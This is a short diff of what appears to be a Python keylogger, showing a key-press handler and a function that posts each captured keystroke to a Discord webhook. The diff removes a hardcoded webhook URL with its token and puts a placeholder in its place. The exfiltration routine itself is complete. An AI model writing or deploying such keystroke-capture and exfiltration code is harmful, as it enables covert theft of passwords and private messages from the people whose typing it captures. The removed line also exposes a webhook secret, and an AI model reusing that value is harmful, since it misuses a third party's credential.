@@ -31,7 +31,7 @@ def on_press(key):
         current_word = []
 
 def send_to_discord(key):
-    url = "https://discord.com/api/webhooks/1309903363550478356/7TzOHTOlo6VOoinI0TumhhqziTIU5yYISUqaqU8EXg2wPTGUhZackDCTcciTvdOZ_a5V"
+    url = YOUR DISCORD WEBHOOK
     data = {"content": key}
     requests.post(url, json=data)
 
